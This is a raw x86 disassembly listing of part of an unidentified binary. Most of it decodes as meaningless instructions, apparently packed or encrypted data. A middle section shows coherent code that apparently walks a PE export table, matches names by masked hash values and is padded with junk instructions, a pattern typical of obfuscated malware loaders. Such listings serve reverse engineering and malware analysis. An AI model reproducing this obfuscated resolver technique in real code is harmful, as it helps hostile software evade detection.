  404714:	mov    al,0xe2
  404716:	in     eax,dx
  404717:	xchg   ecx,eax
  404718:	aam    0xfc
  40471a:	inc    edi
  40471b:	retf   0xe89
  40471e:	jp     0x404799
  404720:	gs mov cl,0x5f
  404723:	add    ch,BYTE PTR [edx-0x48f6e719]
  404729:	fucom  st(4)
  40472b:	aad    0xb6
  40472d:	push   esi
  40472e:	sub    cl,BYTE PTR [edi-0x42]
  404731:	pop    ebp
  404732:	fstp   TBYTE PTR [ebx+ebx*2+0x16872991]
  404739:	loope  0x4046f4
  40473b:	inc    ebp
  40473c:	pop    ebx
  40473d:	(bad)  
  40473f:	xor    DWORD PTR ds:0x30f8b3ca,ecx
  404745:	xor    DWORD PTR [ebx+0x6fd4e0aa],edi
  40474b:	cli    
  40474c:	in     eax,0x82
  40474e:	pop    ss
  40474f:	into   
  404750:	dec    edx
  404751:	xor    bl,BYTE PTR [edx+edx*8]
  404754:	mov    ds:0x8f47e809,al
  404759:	std    
  40475a:	mov    esp,?
  40475c:	xchg   ecx,eax
  40475d:	jo     0x4047d1
  40475f:	retf   
  404760:	rcl    BYTE PTR ds:0x9f6a5fc0,1
  404766:	dec    ebx
  404767:	push   ebp
  404768:	mov    DWORD PTR [edx*4+0x70f2cc7b],edx
  40476f:	cmp    al,0x96
  404771:	outs   dx,BYTE PTR ds:[esi]
  404772:	pop    esp
  404773:	adc    eax,0xf165cb4f
  404778:	xchg   edi,eax
  404779:	imul   edx,DWORD PTR [edi+0x77a3122c],0x516e63a0
  404783:	xchg   DWORD PTR [edx+0x5f],eax
  404786:	adc    eax,edx
  404788:	nop
  404789:	adc    dl,BYTE PTR [esi]
  40478b:	cli    
  40478c:	(bad)  
  40478d:	xor    DWORD PTR [edx+0x42],esp
  404790:	or     edx,DWORD PTR [esp+esi*4]
  404793:	out    0xcc,eax
  404795:	mov    bh,dl
  404797:	int    0xe3
  404799:	dec    edi
  40479a:	push   ecx
  40479b:	adc    al,0xa8
  40479d:	mov    WORD PTR [esi+0x654aa51e],?
  4047a3:	push   ebx
  4047a4:	push   edi
  4047a5:	push   ds
  4047a6:	fist   WORD PTR [ebx+0x5e]
  4047a9:	xchg   ebx,eax
  4047aa:	stos   DWORD PTR es:[edi],eax
  4047ab:	sar    BYTE PTR [ebx],1
  4047ad:	out    dx,eax
  4047ae:	and    eax,0xab6db548
  4047b3:	enter  0x812,0xd1
  4047b7:	ins    BYTE PTR es:[edi],dx
  4047b8:	and    al,0x8b
  4047ba:	add    al,0x7b
  4047bc:	inc    ebp
  4047bd:	and    ah,cl
  4047bf:	call   0x3f47b781
  4047c4:	inc    esp
  4047c5:	adc    al,0xd0
  4047c7:	mov    ecx,0x286c6b08
  4047cc:	retf   
  4047cd:	cmp    bl,BYTE PTR [edi+ebx*8-0x3]
  4047d1:	or     cl,dh
  4047d3:	(bad)  
  4047d4:	leave  
  4047d5:	push   eax
  4047d6:	and    eax,0x1fc3c56f
  4047db:	bound  ebx,QWORD PTR [edi]
  4047dd:	es in  eax,0x93
  4047e0:	ret    
  4047e1:	jno    0x40476c
  4047e3:	fbstp  TBYTE PTR [edx+0x7a0adb8d]
  4047e9:	adc    ch,0x4a
  4047ec:	xor    al,0x20
  4047ee:	cwde   
  4047ef:	aas    
  4047f0:	in     eax,0xa3
  4047f2:	pop    es
  4047f3:	loop   0x4047ea
  4047f5:	pandn  mm6,mm7
  4047f8:	cmp    eax,0xc5019419
  4047fd:	cmp    edi,edi
  4047ff:	push   edi
  404800:	loop   0x40484c
  404802:	mov    ah,0xe7
  404804:	ror    BYTE PTR [edx],cl
  404806:	fiadd  WORD PTR [ebp+0x48536815]
  40480c:	lods   al,BYTE PTR ds:[esi]
  40480d:	nop
  40480e:	xor    eax,0xf5d73b86
  404813:	repnz pop edi
  404815:	outs   dx,DWORD PTR ds:[esi]
  404816:	push   0x2369d65c
  40481b:	add    cl,ah
  40481d:	rol    DWORD PTR [ebp-0x27e4c1d8],1
  404823:	int3   
  404824:	jne    0x4047a6
  404826:	push   ss
  404827:	xchg   esp,eax
  404828:	popa   
  404829:	(bad)  
  40482a:	pop    eax
  40482b:	aaa    
  40482c:	pop    ebp
  40482d:	dec    eax
  40482e:	inc    ebp
  40482f:	outs   dx,BYTE PTR ds:[esi]
  404830:	mov    edi,es
  404832:	push   edx
  404833:	push   ebx
  404834:	ss sub ebx,0xf7724ad1
  40483b:	pop    es
  40483c:	cmp    ah,0x14
  40483f:	repz adc al,0x72
  404842:	cs pusha 
  404844:	imul   eax,DWORD PTR [edi+0x4],0x31
  404848:	(bad)  
  404849:	cmp    al,0x2f
  40484b:	pop    esp
  40484c:	into   
  40484d:	retf   
  40484e:	scas   eax,DWORD PTR es:[edi]
  40484f:	test   DWORD PTR [edi+ecx*1+0x5d2e6288],ecx
  404856:	adc    eax,0xedb2ce18
  40485b:	adc    al,BYTE PTR [esi-0x20]
  40485e:	(bad)  
  40485f:	repnz dec ecx
  404861:	cmp    al,0x59
  404863:	xchg   DWORD PTR [esi+esi*1],edx
  404866:	jle    0x404815
  404868:	(bad)  
  404869:	hlt    
  40486a:	scas   al,BYTE PTR es:[edi]
  40486b:	mov    ecx,0xb5c12102
  404870:	gs retf 
  404872:	retf   
  404873:	push   ecx
  404874:	pop    ecx
  404875:	stc    
  404876:	inc    ebx
  404877:	cmp    cl,BYTE PTR [ecx]
  404879:	mov    bl,0x4
  40487b:	mov    eax,ds
  40487d:	xor    BYTE PTR ds:[ecx+0x1a],dh
  404881:	pop    ss
  404882:	xor    dh,0xf2
  404885:	data16 fidiv DWORD PTR [ebx]
  404888:	cmp    al,0x1c
  40488a:	xor    al,0x63
  40488c:	mov    ds:0x79bcb068,eax
  404891:	dec    ebp
  404892:	mov    bh,0x39
  404894:	adc    al,0xa2
  404896:	sbb    al,0x8e
  404898:	pop    ds
  404899:	mov    eax,0x3554e226
  40489e:	adc    bh,BYTE PTR [ebx]
  4048a0:	(bad)  
  4048a1:	add    bl,BYTE PTR [edx]
  4048a3:	aas    
  4048a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048a5:	or     DWORD PTR [ebx-0x4762939a],ecx
  4048ab:	mov    al,0xd6
  4048ad:	cmc    
  4048ae:	xor    eax,0x9df35af7
  4048b3:	xor    BYTE PTR [ebx],bh
  4048b5:	cli    
  4048b6:	ror    DWORD PTR [edi-0x7f],0xd4
  4048ba:	ds sub ch,bh
  4048bd:	cmp    DWORD PTR [ebx-0x4d671a9e],0x72d6d41c
  4048c7:	ret    
  4048c8:	dec    ecx
  4048c9:	add    bl,cl
  4048cb:	test   BYTE PTR [esi+0x62],0x6
  4048cf:	jns    0x404860
  4048d1:	cmc    
  4048d2:	pop    es
  4048d3:	loopne 0x404870
  4048d5:	add    DWORD PTR [edi],esi
  4048d7:	jecxz  0x404901
  4048d9:	cld    
  4048da:	and    ch,BYTE PTR [edx]
  4048dc:	pop    ds
  4048dd:	sub    DWORD PTR [edx],0xffffffad
  4048e0:	mov    gs,edi
  4048e2:	xchg   ebp,eax
  4048e3:	ds loop 0x40495f
  4048e6:	call   0xd13c:0xb4aa8b6b
  4048ed:	fwait
  4048ee:	sub    DWORD PTR [edi+ebx*2],0x1f17b97c
  4048f5:	xor    bh,BYTE PTR [eax+ebx*4-0x73a618fb]
  4048fc:	pop    eax
  4048fd:	xor    BYTE PTR [eax],ch
  4048ff:	rcr    BYTE PTR [eax+0x6],1
  404902:	sbb    esi,DWORD PTR [ecx-0x28c0416f]
  404908:	in     al,0xfa
  40490a:	fild   DWORD PTR [edi]
  40490c:	int    0x77
  40490e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40490f:	and    BYTE PTR [ebp+0x59],bh
  404912:	or     eax,0x8174a8
  404917:	in     al,0xba
  404919:	fwait
  40491a:	cmp    bl,BYTE PTR ds:0xd06733cd
  404920:	add    ebp,DWORD PTR [ecx]
  404922:	adc    eax,0x19cfa5f
  404927:	push   es
  404928:	or     eax,0x5b87b3ea
  40492d:	dec    ecx
  40492e:	iret   
  40492f:	pusha  
  404930:	in     eax,dx
  404931:	fidivr WORD PTR ds:[esi-0x13]
  404935:	sbb    al,0xb8
  404937:	(bad)  
  404939:	lock pop es
  40493b:	xor    cl,dl
  40493d:	imul   ebx,edi,0xffffffd4
  404940:	jno    0x40493b
  404942:	lods   eax,DWORD PTR ds:[esi]
  404943:	int    0x58
  404945:	pop    es
  404946:	jno    0x404955
  404948:	add    al,0x6c
  40494a:	push   0x38
  40494c:	mov    ecx,0x76d3827
  404951:	xchg   esi,eax
  404952:	lds    ebx,FWORD PTR [edx-0x42]
  404955:	stos   DWORD PTR es:[edi],eax
  404956:	mov    esi,0xfed76689
  40495b:	adc    edx,DWORD PTR ds:0xd0ae64a5
  404961:	cdq    
  404962:	xor    DWORD PTR [esi],ecx
  404964:	jge    0x40498e
  404966:	or     edi,DWORD PTR [edi-0x74d74dbf]
  40496c:	leave  
  40496d:	mov    al,ds:0x48004052
  404972:	cmc    
  404973:	lds    esi,FWORD PTR [edx-0x26b92f7]
  404979:	(bad)  
  40497a:	loopne 0x4049ad
  40497c:	xchg   ebx,eax
  40497d:	inc    edi
  40497e:	xlat   BYTE PTR ds:[ebx]
  40497f:	and    ah,cl
  404981:	mov    ecx,DWORD PTR [eax]
  404983:	mov    eax,ds:0xd2bb5c12
  404988:	(bad)  
  404989:	stc    
  40498a:	int3   
  40498b:	std    
  40498c:	jmp    0xbb83:0x7ecb6b62
  404993:	out    dx,eax
  404994:	and    al,0x13
  404996:	ret    
  404997:	jmp    0xa81d:0xbac1326c
  40499e:	hlt    
  40499f:	jns    0x40492c
  4049a1:	push   edx
  4049a2:	pop    ebp
  4049a3:	mov    ch,0x19
  4049a5:	jbe    0x4049b0
  4049a7:	in     al,dx
  4049a8:	xor    ah,BYTE PTR [ebx+0x1a09bb28]
  4049ae:	adc    ebp,edx
  4049b0:	mov    dh,0x67
  4049b2:	adc    edi,0x92bd3269
  4049b8:	cli    
  4049b9:	dec    ebp
  4049ba:	mov    ebx,0xce0dbe16
  4049bf:	inc    edx
  4049c0:	mov    eax,0x944fa1c
  4049c5:	int    0x44
  4049c7:	or     ebp,0x4b721f98
  4049cd:	or     al,0x57
  4049cf:	and    eax,0x12764d4c
  4049d4:	pop    ecx
  4049d5:	push   es
  4049d6:	xor    esp,DWORD PTR [ebx]
  4049d8:	inc    edx
  4049d9:	xor    bl,BYTE PTR [edi-0x7c5f88f0]
  4049df:	adc    bl,dh
  4049e1:	arpl   WORD PTR [edx+0x48264d3b],di
  4049e7:	jl     0x404a43
  4049e9:	fsubr  QWORD PTR [ebx]
  4049eb:	jp     0x404977
  4049ed:	dec    ecx
  4049ee:	gs pop edx
  4049f0:	pop    esi
  4049f1:	cmp    ebp,DWORD PTR [ecx-0x3c]
  4049f4:	(bad)  
  4049f5:	xchg   ebx,eax
  4049f6:	mov    ebp,0xeb13a8f8
  4049fb:	push   esi
  4049fc:	mov    dh,0xb6
  4049fe:	dec    ecx
  4049ff:	adc    edx,ebp
  404a01:	add    BYTE PTR [ebp-0x55],ah
  404a04:	jae    0x4049f7
  404a06:	jbe    0x404990
  404a08:	pop    es
  404a09:	xchg   ebx,eax
  404a0a:	pusha  
  404a0b:	(bad)
  404a0e:	cmp    DWORD PTR ds:0xfa5226fc,ebx
  404a14:	stos   BYTE PTR es:[edi],al
  404a15:	outs   dx,DWORD PTR ds:[esi]
  404a16:	and    dh,BYTE PTR ds:0x47a3d2b2
  404a1c:	inc    esp
  404a1d:	int    0x4a
  404a1f:	jne    0x404a61
  404a21:	and    al,0xc9
  404a23:	inc    eax
  404a24:	retf   
  404a25:	mov    ds:0x97eeeeb7,al
  404a2a:	dec    esp
  404a2b:	cwde   
  404a2c:	xchg   ebx,eax
  404a2d:	pusha  
  404a2e:	das    
  404a2f:	xor    ch,bh
  404a31:	adc    DWORD PTR [eax+0x7072a58],eax
  404a37:	push   ebp
  404a38:	icebp  
  404a39:	add    ebx,DWORD PTR [edi-0x52992911]
  404a3f:	add    BYTE PTR [ebp-0x64e91fb7],0x35
  404a46:	jno    0x404a5e
  404a48:	inc    edi
  404a49:	xchg   BYTE PTR [ebx],cl
  404a4b:	dec    edx
  404a4c:	fsub   DWORD PTR [ecx+0x62dddb0b]
  404a52:	rep stos DWORD PTR es:[edi],eax
  404a54:	push   ss
  404a55:	pop    ecx
  404a56:	nop
  404a57:	mov    eax,ds:0x99239aef
  404a5c:	dec    ebp
  404a5d:	cmovno edx,DWORD PTR [eax]
  404a60:	lods   eax,DWORD PTR ds:[esi]
  404a61:	fild   QWORD PTR [edx+0x542505f8]
  404a67:	test   BYTE PTR [ebx-0xcbe28ef],cl
  404a6d:	(bad)  
  404a6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a6f:	fidiv  DWORD PTR [edx-0x32bb5862]
  404a75:	inc    edx
  404a76:	mov    edx,0x27985a02
  404a7b:	push   ds
  404a7c:	cmp    bh,cl
  404a7e:	xchg   dh,ch
  404a80:	push   es
  404a81:	shrd   eax,edi,0x76
  404a85:	adc    eax,0x33a3ec07
  404a8a:	jno    0x404ac1
  404a8c:	loope  0x404adb
  404a8e:	cmp    bh,BYTE PTR [edx]
  404a90:	arpl   WORD PTR [esi],bx
  404a92:	or     bl,BYTE PTR [eax+0x36548f7c]
  404a98:	xor    BYTE PTR [esi+0x57],0xc4
  404a9c:	adc    eax,DWORD PTR [edx+eax*1]
  404a9f:	lahf   
  404aa0:	or     al,0xc9
  404aa2:	and    dl,BYTE PTR [edi-0x5a0314c0]
  404aa8:	aad    0xdc
  404aaa:	mov    edx,0x88394b9e
  404aaf:	mov    ah,0x8f
  404ab1:	dec    ecx
  404ab2:	retf   0xe55a
  404ab5:	sbb    eax,0x2f7485b6
  404aba:	xchg   edi,eax
  404abb:	adc    BYTE PTR [esi+ebx*1+0xb],bh
  404abf:	jmp    0x7b3e5dd3
  404ac4:	xchg   ecx,eax
  404ac5:	mov    bl,0x42
  404ac7:	imul   eax,DWORD PTR [ecx],0x7e
  404aca:	ds pop ebp
  404acc:	xchg   ecx,eax
  404acd:	jbe    0x404ab5
  404acf:	add    DWORD PTR [ecx+0x22449cc5],esi
  404ad5:	adc    eax,0xfcff8465
  404ada:	adc    al,cl
  404adc:	fbld   TBYTE PTR [ecx-0xc5f510b]
  404ae2:	pmovmskb edi,mm0
  404ae5:	aam    0x1e
  404ae7:	or     BYTE PTR [esi+0x8],cl
  404aea:	sbb    bh,BYTE PTR [eax]
  404aec:	dec    ebp
  404aed:	jp     0x404b54
  404aef:	les    edx,FWORD PTR [esi+0x1a]
  404af2:	or     dh,BYTE PTR ds:0xcd804682
  404af8:	xor    BYTE PTR [edx+edi*8-0x5124d18d],ah
  404aff:	xchg   ebx,eax
  404b00:	cli    
  404b01:	jnp    0x404b0c
  404b03:	call   0xfea5:0x76b477fb
  404b0a:	(bad)  
  404b0b:	sub    DWORD PTR [edx-0x6d7b6beb],esp
  404b11:	out    dx,eax
  404b12:	retf   
  404b13:	add    BYTE PTR [edx+0xc4d25cd],ch
  404b19:	mov    bl,0x87
  404b1b:	cli    
  404b1c:	(bad)  
  404b1d:	push   ecx
  404b1e:	dec    ebx
  404b1f:	xor    DWORD PTR [eax-0x57fd0c42],ebp
  404b25:	sub    al,0x6
  404b27:	lds    edx,FWORD PTR ds:0x3a62c3fe
  404b2d:	fild   DWORD PTR [eax-0x38a3cdc4]
  404b33:	sahf   
  404b34:	leave  
  404b35:	fwait
  404b36:	and    BYTE PTR [ebx],dh
  404b38:	enter  0x32f6,0xd7
  404b3c:	or     al,0xa2
  404b3e:	jl     0x404ad5
  404b40:	mov    ss,WORD PTR ds:0xed325ad
  404b46:	xor    ebx,ebx
  404b48:	test   edi,esp
  404b4a:	cmp    BYTE PTR [ebp+0x31],dh
  404b4d:	mov    bh,0x1c
  404b4f:	mov    cs,WORD PTR [edx]
  404b51:	push   edx
  404b52:	or     BYTE PTR [ebx],dl
  404b54:	xchg   ecx,eax
  404b55:	lock test DWORD PTR [eax-0x2],ebx
  404b59:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  404b5b:	clc    
  404b5c:	mov    dl,0x70
  404b5e:	mov    ds,ebp
  404b60:	mov    dh,0x80
  404b62:	mov    eax,0x70acf08c
  404b67:	cld    
  404b68:	dec    ecx
  404b69:	inc    esp
  404b6a:	mov    ?,edx
  404b6c:	fnsave [ebx+eiz*8-0x4364a6ed]
  404b73:	aas    
  404b74:	out    0xe0,al
  404b76:	push   eax
  404b77:	push   esi
  404b78:	add    DWORD PTR [ebp+0x745d3635],esi
  404b7e:	imul   esi,DWORD PTR [edi],0xa5b86433
  404b84:	sbb    al,0xf6
  404b86:	xlat   BYTE PTR ds:[ebx]
  404b87:	ret    0xef30
  404b8a:	mov    ebx,0xf7c7cfe6
  404b8f:	popa   
  404b90:	fst    DWORD PTR [esi+0xeb9711]
  404b96:	popa   
  404b97:	call   0x5d34:0xd63e0c24
  404b9e:	jp     0x404b49
  404ba0:	mov    ah,0xb9
  404ba2:	aas    
  404ba3:	inc    edi
  404ba4:	cmp    bl,ch
  404ba6:	arpl   WORD PTR [edx-0x32],dx
  404ba9:	cs inc ecx
  404bab:	mov    edi,0x9b5459a4
  404bb0:	cmp    bh,BYTE PTR [esp+ebx*2-0x33]
  404bb4:	std    
  404bb5:	jl     0x404be7
  404bb7:	gs pop es
  404bb9:	inc    eax
  404bba:	outs   dx,BYTE PTR ds:[esi]
  404bbb:	jnp    0x404c03
  404bbd:	jmp    0x404b62
  404bbf:	jo     0x404c36
  404bc1:	and    DWORD PTR [ecx],esp
  404bc3:	imul   cx,sp,0xcf6d
  404bc8:	ss in  eax,dx
  404bca:	fdivr  QWORD PTR [ecx+0x80d7140]
  404bd0:	into   
  404bd1:	push   ds
  404bd2:	sar    DWORD PTR [edx],0xc5
  404bd5:	out    dx,al
  404bd6:	lahf   
  404bd7:	mov    edi,0xea670575
  404bdc:	loop   0x404baf
  404bde:	inc    ebp
  404bdf:	sub    al,0x9e
  404be1:	jmp    ebx
  404be3:	repnz mov esi,0xe30aaf4b
  404be9:	lods   eax,DWORD PTR ds:[esi]
  404bea:	add    al,0x81
  404bec:	fst    QWORD PTR [esi+0x17]
  404bef:	(bad)  
  404bf0:	xor    DWORD PTR [edx],esp
  404bf2:	mov    dl,0x9
  404bf4:	aas    
  404bf5:	sbb    al,0xd5
  404bf7:	adc    eax,0xd5d4349a
  404bfc:	xchg   ebp,eax
  404bfd:	into   
  404bfe:	push   ebx
  404bff:	push   edx
  404c00:	mov    esi,0x558203c9
  404c06:	bound  eax,QWORD PTR [edi+0x2d4ba1e4]
  404c0c:	sub    al,0xd0
  404c0e:	mov    bl,0x57
  404c10:	call   0x1924:0xefb5b6bc
  404c17:	push   es
  404c18:	mov    eax,0xd0f96fd9
  404c1d:	rcr    BYTE PTR [ecx+0xb],cl
  404c20:	sub    BYTE PTR [ebx+0x5e239023],ah
  404c26:	adc    eax,0x14184321
  404c2b:	xor    ch,BYTE PTR [ebp+ecx*8+0x5a]
  404c2f:	pop    esp
  404c30:	call   0x7176a8a4
  404c35:	scas   al,BYTE PTR es:[edi]
  404c36:	call   0xa82f:0x8c44b547
  404c3d:	loope  0x404ca8
  404c3f:	jae    0x404c0d
  404c41:	test   al,0x7b
  404c43:	adc    DWORD PTR [ebx+0x64],esi
  404c46:	xor    al,0x28
  404c48:	lds    esp,FWORD PTR [esi+0x1d]
  404c4b:	push   0x33
  404c4d:	sbb    ah,BYTE PTR [esi-0x54acb330]
  404c53:	cld    
  404c54:	and    eax,0xfc458b42
  404c59:	mov    ecx,DWORD PTR [ebp-0x18]
  404c5c:	xor    eax,ebx
  404c5e:	add    eax,edi
  404c60:	cmp    ecx,eax
  404c62:	je     0x404e26
  404c68:	mov    eax,ds:0x422014
  404c6d:	sbb    DWORD PTR ds:0x420fb4,eax
  404c73:	mov    eax,DWORD PTR [ebp-0x18]
  404c76:	mov    eax,DWORD PTR [eax+0x18]
  404c79:	mov    DWORD PTR [ebp-0x24],eax
  404c7c:	dec    DWORD PTR ds:0x420fa4
  404c82:	mov    eax,DWORD PTR [ebp-0x18]
  404c85:	mov    ecx,DWORD PTR ds:0x420e7a
  404c8b:	xor    ecx,DWORD PTR ds:0x422010
  404c91:	mov    DWORD PTR ds:0x420e7a,ecx
  404c97:	mov    ecx,DWORD PTR [ebp+0x8]
  404c9a:	add    ecx,DWORD PTR [eax+0x20]
  404c9d:	mov    DWORD PTR [ebp-0x2c],ecx
  404ca0:	or     eax,DWORD PTR ds:0x420efc
  404ca6:	mov    eax,DWORD PTR [ebp-0x18]
  404ca9:	mov    ecx,DWORD PTR [ebp+0x8]
  404cac:	xor    DWORD PTR ds:0x420f70,0x420fa0
  404cb6:	add    ecx,DWORD PTR [eax+0x24]
  404cb9:	xor    eax,eax
  404cbb:	add    eax,DWORD PTR ds:0x420e96
  404cc1:	xor    DWORD PTR ds:0x422004,eax
  404cc7:	mov    DWORD PTR [ebp-0x34],ecx
  404cca:	mov    eax,DWORD PTR [ebp-0x18]
  404ccd:	mov    ecx,DWORD PTR [ebp+0x8]
  404cd0:	xor    DWORD PTR ds:0x422018,0x422010
  404cda:	add    ecx,DWORD PTR [eax+0x1c]
  404cdd:	mov    DWORD PTR ds:0x420ea2,ebx
  404ce3:	mov    eax,edi
  404ce5:	mov    DWORD PTR ds:0x420ef8,0x31e9
  404cef:	mov    DWORD PTR [ebp-0x18],ecx
  404cf2:	mov    DWORD PTR ds:0x422000,0x101a
  404cfc:	jmp    0x404dee
  404d01:	mov    DWORD PTR ds:0x420fb4,0x15
  404d0b:	cmp    DWORD PTR ds:0x420fb4,0x0
  404d12:	je     0x404d62
  404d18:	cmp    DWORD PTR ds:0x420fb4,0x8
  404d1f:	jne    0x404d34
  404d25:	push   DWORD PTR [ebp-0x24]
  404d28:	push   DWORD PTR [ebp-0x20]
  404d2b:	push   DWORD PTR [ebp-0x20]
  404d2e:	call   DWORD PTR ds:0x4247e1
  404d34:	cmp    DWORD PTR ds:0x420fb4,0x9
  404d3b:	jne    0x404d50
  404d41:	xor    edx,edx
  404d43:	add    edx,DWORD PTR ds:0x420fb4
  404d49:	dec    edx
  404d4a:	mov    DWORD PTR ds:0x420fb4,edx
  404d50:	mov    edx,DWORD PTR ds:0x420fb4
  404d56:	dec    edx
  404d57:	mov    DWORD PTR ds:0x420fb4,edx
  404d5d:	jmp    0x404d0b
  404d62:	mov    ecx,DWORD PTR [ebp-0x2c]
  404d65:	xor    edx,DWORD PTR ds:0x420e96
  404d6b:	mov    edx,DWORD PTR [ebp+0x8]
  404d6e:	add    DWORD PTR ds:0x420fb0,0x420f70
  404d78:	add    edx,DWORD PTR [ecx+esi*4]
  404d7b:	mov    DWORD PTR [ebp-0x28],edx
  404d7e:	movzx  ecx,BYTE PTR ds:0x420f00
  404d85:	or     DWORD PTR ds:0x420e7a,ecx
  404d8b:	mov    ecx,DWORD PTR [ebp-0x4]
  404d8e:	mov    edx,DWORD PTR [ebp-0x28]
  404d91:	adc    DWORD PTR ds:0x420fb4,0x420f00
  404d9b:	xor    ecx,ebx
  404d9d:	add    ecx,eax
  404d9f:	cmp    edx,ecx
  404da1:	mov    DWORD PTR ds:0x422000,0x2434
  404dab:	je     0x404dee
  404db1:	jmp    0x404dda
  404db6:	mov    ecx,DWORD PTR [ebp-0x4]
  404db9:	mov    edx,DWORD PTR [ebp-0x8]
  404dbc:	xor    ecx,ebx
  404dbe:	add    ecx,eax
  404dc0:	cmp    edx,ecx
  404dc2:	je     0x404e32
  404dc8:	mov    ecx,DWORD PTR [ebp-0x4]
  404dcb:	mov    edx,DWORD PTR [ebp-0x30]
  404dce:	xor    ecx,ebx
  404dd0:	add    ecx,eax
  404dd2:	cmp    edx,ecx
  404dd4:	je     0x404e41
  404dda:	lea    eax,[ebp-0x8]
  404ddd:	push   eax
  404dde:	push   DWORD PTR [ebp-0x28]
  404de1:	push   DWORD PTR [ebp+0xc]
  404de4:	call   0x410c6c
  404de9:	mov    eax,0x3272dd
  404dee:	mov    ecx,DWORD PTR [ebp-0x4]
  404df1:	mov    edx,DWORD PTR [ebp-0x8]
  404df4:	xor    ecx,ebx
  404df6:	add    ecx,eax
  404df8:	cmp    edx,ecx
  404dfa:	je     0x404e15
  404e00:	mov    ecx,DWORD PTR [ebp-0x34]
  404e03:	movzx  ecx,WORD PTR [ecx+esi*2]
  404e07:	mov    edx,DWORD PTR [ebp-0x18]
  404e0a:	mov    ecx,DWORD PTR [edx+ecx*4]
  404e0d:	mov    DWORD PTR [ebp-0x38],ecx
  404e10:	jmp    0x404db6
  404e15:	mov    ecx,DWORD PTR [ebp-0x14]
  404e18:	xor    ecx,ebx
  404e1a:	lea    esi,[esi+ecx*1+0x3272dd]
  404e21:	jmp    0x402787
  404e26:	mov    eax,DWORD PTR [ebp-0x4]
  404e29:	xor    eax,ebx
  404e2b:	add    eax,edi
  404e2d:	jmp    0x407332
  404e32:	mov    eax,DWORD PTR [ebp-0x4]
  404e35:	xor    eax,ebx
  404e37:	add    eax,0x3272dd
  404e3c:	jmp    0x407332
  404e41:	mov    ecx,DWORD PTR [ebp-0x38]
  404e44:	add    ecx,DWORD PTR [ebp+0x8]
  404e47:	mov    DWORD PTR [ebp-0x10],ecx
  404e4a:	mov    ecx,DWORD PTR [ebp-0x1c]
  404e4d:	test   ecx,ecx
  404e4f:	je     0x4072bd
  404e55:	mov    DWORD PTR [ebp-0x20],0x0
  404e5c:	push   0x3
  404e5e:	xor    edx,edx
  404e60:	pop    edx
  404e61:	add    edx,0x8
  404e64:	push   edx
  404e65:	pop    ecx
  404e66:	push   0x6
  404e68:	dec    ecx
  404e69:	pop    ebx
  404e6a:	dec    ebx
  404e6b:	xchg   ebx,ecx
  404e6d:	sub    ebx,ecx
  404e6f:	xchg   ebx,ecx
  404e71:	dec    ecx
  404e72:	mov    eax,DWORD PTR [ebp-0x1c]
  404e75:	imul   eax,ecx
  404e78:	sub    esp,eax
  404e7a:	mov    DWORD PTR [ebp-0x20],esp
  404e7d:	mov    eax,DWORD PTR [ebp-0x4]
  404e80:	mov    ecx,0x7510896
  404e85:	jmp    0x407212
  404e8a:	lock into 
  404e8c:	inc    esi
  404e8d:	push   cs
  404e8e:	mov    BYTE PTR [esi-0x8],dh
  404e91:	mov    al,0xbe
  404e93:	(bad)  
  404e94:	fs cld 
  404e96:	push   esp
  404e97:	js     0x404efb
  404e99:	pop    eax
  404e9a:	or     bl,BYTE PTR [edi+0x7a]
  404e9d:	jp     0x404ea9
  404e9f:	pop    edi
  404ea0:	jp     0x404f1c
  404ea2:	dec    eax
  404ea3:	nop
  404ea4:	imul   ebp,DWORD PTR [eax+0x169e28d3],0xffffffca
  404eab:	cmovl  esi,DWORD PTR [ebx+0x389176a3]
  404eb2:	int3   
  404eb3:	jmp    0x404eac
  404eb5:	or     BYTE PTR [edx],ah
  404eb7:	sbb    al,0xc9
  404eb9:	dec    edi
  404eba:	inc    ebp
  404ebb:	add    dh,bl
  404ebd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ebe:	dec    ecx
  404ebf:	test   DWORD PTR [ebp-0x7a8c1bfe],esp
  404ec5:	mov    BYTE PTR [eax],ch
  404ec7:	popa   
  404ec8:	mov    ebx,0x64564261
  404ecd:	into   
  404ece:	mov    ds:0xd78a204b,eax
  404ed3:	div    BYTE PTR [edx+0x6]
  404ed6:	inc    esi
  404ed7:	aas    
  404ed8:	frstor [edi]
  404eda:	dec    dx
  404edc:	addr16 ss cli 
  404edf:	nop
  404ee0:	xor    eax,0xd3b76a56
  404ee5:	mov    ds:0xcf681097,eax
  404eea:	jg     0x404ea1
  404eec:	in     eax,0xad
  404eee:	(bad)  
  404eef:	outs   dx,BYTE PTR ds:[esi]
  404ef0:	mov    dl,0x94
  404ef2:	ja     0x404ee1
  404ef4:	imul   eax,DWORD PTR [ebp+ebx*1+0x31fcc78c],0xfffffff1
  404efc:	aas    
  404efd:	xchg   ebp,eax
  404efe:	xchg   esi,eax
  404eff:	add    ebx,DWORD PTR [eax-0x64]
  404f02:	inc    esp
  404f03:	jb     0x404eeb
  404f05:	(bad)  
  404f06:	fmul   DWORD PTR [edi+0x15]
  404f09:	mov    BYTE PTR [esp+eax*1-0xd4b926d],cl
  404f10:	push   WORD PTR [ebx+ebp*2]
  404f14:	addr16 pop eax
  404f16:	push   esp
  404f17:	mov    ebx,DWORD PTR [eax+ecx*2]
  404f1a:	adc    al,0x92
  404f1c:	push   0x4cb1a2f1
  404f21:	and    edi,0x94f5c88c
  404f27:	add    al,0x46
  404f29:	in     eax,dx
  404f2a:	and    dh,BYTE PTR [edi-0x60]
  404f2d:	adc    bh,ch
  404f2f:	(bad)  
  404f30:	mov    al,ds:0x895a1702
  404f35:	jno    0x404f7a
  404f37:	jp     0x404edd
  404f39:	jp     0x404ec8
  404f3b:	in     eax,dx
  404f3c:	add    al,0x65
  404f3e:	mov    ecx,0x56f74c79
  404f43:	sbb    ecx,DWORD PTR [edi]
  404f45:	test   DWORD PTR [ebx],0x4e7fac6a
  404f4b:	lea    eax,[ecx+0x6d]
  404f4e:	mov    ch,0x53
  404f50:	ds in  al,dx
  404f52:	je     0x404f02
  404f54:	popw   ss
  404f56:	sbb    DWORD PTR [ebx+ecx*8+0x2e3974cf],edx
  404f5d:	ret    0x3a98
  404f60:	dec    edi
  404f61:	imul   edi,eax,0xb4652bfb
  404f67:	mov    al,ds:0x81279da9
  404f6c:	icebp  
  404f6d:	jmp    0x404f6b
  404f6f:	push   es
  404f70:	cmp    DWORD PTR [esi],0xf706507e
  404f76:	sub    bl,BYTE PTR [ebx]
  404f78:	push   0x71
